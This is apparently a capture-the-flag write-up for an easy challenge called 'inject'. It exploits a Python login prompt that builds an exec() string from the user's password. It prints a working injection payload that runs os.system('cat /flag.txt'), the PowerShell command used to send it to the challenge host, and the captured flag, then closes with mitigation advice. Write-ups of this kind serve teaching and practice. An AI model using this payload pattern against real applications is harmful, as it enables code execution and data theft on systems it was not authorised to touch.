# inject (AirOverflow Arena) – Writeup

Challenge: "inject" (misc, Easy)

Points: 200

Date solved: 2025-10-18

---

## TL;DR

- The service is a Python auth prompt that dangerously uses `exec` with the user-supplied password embedded directly in a string.
- Injecting Python code into the password lets us execute commands inside the container.
- Payload used: `") or __import__('os').system('cat /flag.txt') or True or ("`
- Flag obtained: `PCC{B4S1C_PYTH0N_INJ3CTI0N_OJCMXT32oXn}`

---

## Files provided

- `inject.zip` → contains:
  - `inject.py` — the vulnerable program
  - `Dockerfile` — shows a `flag.txt` is copied to `/flag.txt` in the container

### Key code (from `inject.py`)

```python
for user in users:
    try:
        exec('if (username == user["username"]) and ("'+password+'" == user["password"]): passwordCorrect = True; authenticated_user = user')
    except Exception as e:
        ...
```

- The `password` is inserted directly into an `exec` string, so we can break out of the quoted context and run arbitrary Python.

### Dockerfile confirms flag path

```dockerfile
ENV FLAG_FILE="/flag.txt"
COPY flag.txt ${FLAG_FILE}
```

---

## Local exploration (optional)

Not required, but if you wanted to run locally, you could:

1. Build and run the Docker image (requires Docker):
   ```powershell
   docker build -t arena-inject .
   docker run --rm -it -p 8000:8000 arena-inject
   ```
   The challenge runs as a TCP/stdio program in the container base image; you would attach and interact via `docker exec -it`.

---

## Exploitation logic

- The password comparison is inside `exec` and looks like: `("<password>" == user["password"])`.
- By supplying a password that closes the string, injects our own Python, then re-opens the expression, we bypass validation and run our code.

### Working payload

```
") or __import__('os').system('cat /flag.txt') or True or ("
```

Why it works:
- `")` closes the opening string.
- `or __import__('os').system('cat /flag.txt')` executes `cat /flag.txt`; `system` returns the exit code.
- `or True or ("` keeps the whole `if (...)` condition syntactically valid and truthy, avoiding exceptions.

---

## Getting the flag from the remote container

Your container gets assigned a port when started. Example from the session screenshot:

- Host: `c1.arena.airoverflow.com`
- Port: `12419` (yours may change when restarting)

We automated the interaction with a small PowerShell script: `send_payload.ps1`.

### Script path

`c:\Users\haryp\Downloads\inject\send_payload.ps1`

### Script contents (summary)

- Opens a TCP connection to the given host/port
- Sends username `bob`
- Sends the injection payload as the password
- Reads and prints all output

### Run it

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File "c:\Users\haryp\Downloads\inject\send_payload.ps1" -Port 12419
```

If the container restarts and the port changes, just update `-Port` to the new value from the Arena page.

---

## Output and flag

Sample run output included (truncated banner for brevity):

```
👤 Username: 🔑 Password: PCC{B4S1C_PYTH0N_INJ3CTI0N_OJCMXT32oXn}
PCC{B4S1C_PYTH0N_INJ3CTI0N_OJCMXT32oXn}
```

Final flag:

```
PCC{B4S1C_PYTH0N_INJ3CTI0N_OJCMXT32oXn}
```

---

## Notes and mitigation

- Never use `exec`/`eval` with untrusted input. If string interpolation is required, use safe parsing and strict validation.
- For authentication, compare values directly in code, not via dynamically generated Python strings.
- Consider static analyzers or linters that flag dangerous patterns.
